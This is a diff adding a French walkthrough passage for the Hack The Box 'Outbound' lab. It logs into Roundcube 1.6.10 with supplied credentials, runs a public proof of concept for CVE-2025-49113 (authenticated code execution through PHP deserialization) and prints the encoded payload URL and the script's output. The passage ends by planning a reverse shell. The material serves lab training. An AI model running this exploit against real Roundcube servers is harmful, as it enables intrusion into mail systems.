@@ -417,13 +417,137 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 ## Prise pied
 
+Lorsque tu accèdes à `http://outbound.htb/`, tu es automatiquement redirigé vers `http://mail.outbound.htb/` et tu tombes sur l’interface de connexion de Roundcube Webmail.
+
+L’objectif consiste maintenant à identifier précisément la version utilisée afin de rechercher une vulnérabilité exploitable permettant d’obtenir un accès initial.
+
+### Identification du webmail Roundcube
+
+Hack The Box fournit des identifiants initiaux dans la section *Machine Information*.  
+
+
+![Capture d’écran de la section “Machine Information” de Hack The Box indiquant les identifiants initiaux fournis pour la machine Outbound : utilisateur tyler avec le mot de passe LhKL1o9Nm3X2](machine-info-account-tyler.png)
+
+Tu peux donc te connecter à l’interface Roundcube avec le compte suivant :
+
+```text
+tyler : LhKL1o9Nm3X2
+```
+
+
+
 ![alt="Interface de connexion Roundcube Webmail 1.6.10 accessible sur mail.outbound.htb avec formulaire d’authentification utilisateur"](webmail-login.png)
+
+
+
+Une fois connecté avec le compte `tyler`, tu peux accéder aux informations de version via le menu **About** disponible en bas à gauche du dashboard.
+
+
+
+![Interface Roundcube Webmail après connexion avec le compte tyler, montrant le menu About accessible en bas à gauche du dashboard afin d’obtenir les informations de version de l’application](roundcube-dasboard.png)
 
 
 
 <img src="roundcube-about.png" alt="Fenêtre About de Roundcube Webmail 1.6.10 affichant la version installée et les plugins actifs sur outbound.htb" class="img-left-80">
 
+La fenêtre **About** permet d’identifier précisément la version utilisée par le webmail :
 
+```text
+Roundcube Webmail 1.6.10
+```
+
+
+
+Une recherche rapide sur cette version permet de trouver la vulnérabilité `CVE-2025-49113`, décrite comme :
+
+```text
+A critical post-authentication Remote Code Execution vulnerability
+```
+
+Cette faille permet à un utilisateur authentifié d’obtenir une exécution de code à distance sur le serveur hébergeant Roundcube.
+
+Comme tu disposes déjà d’identifiants valides fournis par Hack The Box, cette vulnérabilité devient immédiatement exploitable.
+
+### Exploitation de CVE-2025-49113
+
+Un exploit public est disponible pour `CVE-2025-49113` sur le dépôt GitHub suivant :
+
+https://github.com/fearsoff-org/CVE-2025-49113
+
+Tu commences donc par récupérer le PoC sur ta machine Kali :
+
+```bash
+git clone https://github.com/fearsoff-org/CVE-2025-49113.git
+cd CVE-2025-49113
+```
+
+Avant d’utiliser le PoC, tu peux commencer par afficher son aide afin de vérifier les paramètres attendus :
+
+```bash
+php CVE-2025-49113.php
+```
+
+Le script affiche alors l’usage suivant :
+
+```bash
+### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]
+
+### Usage: php CVE-2025-49113.php <target_url> <username> <password> <command>
+```
+
+Le PoC nécessite simplement :
+
+- l’URL cible
+- un utilisateur Roundcube valide
+- son mot de passe
+- la commande à exécuter sur le serveur
+
+Tu peux alors tester l’exécution de commandes sur le serveur avec une commande système simple comme `id` :
+
+```bash
+php CVE-2025-49113.php \
+  http://mail.outbound.htb \
+  tyler \
+  'LhKL1o9Nm3X2' \
+  'id'
+```
+
+Résultat :
+
+```bash
+php CVE-2025-49113.php \
+  http://mail.outbound.htb \
+  tyler \
+  'LhKL1o9Nm3X2' \
+  'id'
+
+### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]
+
+### Retrieving CSRF token and session cookie...
+
+### Authenticating user: tyler
+
+### Authentication successful
+
+### Command to be executed: 
+id
+
+### Injecting payload...
+
+### End payload: http://mail.outbound.htb/?_from=edit-%21%C4%22%C4%3B%C4i%C4%3A%C40%C4%3B%C4O%C4%3A%C41%C46%C4%3A%C4%22%C4C%C4r%C4y%C4p%C4t%C4_%C4G%C4P%C4G%C4_%C4E%C4n%C4g%C4i%C4n%C4e%C4%22%C4%3A%C41%C4%3A%C4%7B%C4S%C4%3A%C42%C46%C4%3A%C4%22%C4%5C%C40%C40%C4C%C4r%C4y%C4p%C4t%C4_%C4G%C4P%C4G%C4_%C4E%C4n%C4g%C4i%C4n%C4e%C4%5C%C40%C40%C4_%C4g%C4p%C4g%C4c%C4o%C4n%C4f%C4%22%C4%3B%C4S%C4%3A%C44%C4%3A%C4%22%C4i%C4d%C4%3B%C4%23%C4%22%C4%3B%C4%7D%C4i%C4%3A%C40%C4%3B%C4b%C4%3A%C40%C4%3B%C4%7D%C4%22%C4%3B%C4%7D%C4%7D%C4&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload
+
+### Payload injected successfully
+
+### Executing payload...
+
+### Exploit executed successfully
+```
+
+Le script semble s’exécuter correctement, mais aucun résultat de commande n’est renvoyé directement dans le terminal.
+
+Tu testes ensuite plusieurs méthodes classiques afin de confirmer l’exécution de code à distance, notamment avec `ping` vers ta machine Kali, sans succès.
+
+L’exploit ne permettant pas d’obtenir facilement une sortie de commande exploitable, le plus simple consiste alors à tenter directement l’obtention d’un reverse shell.
 
 
 
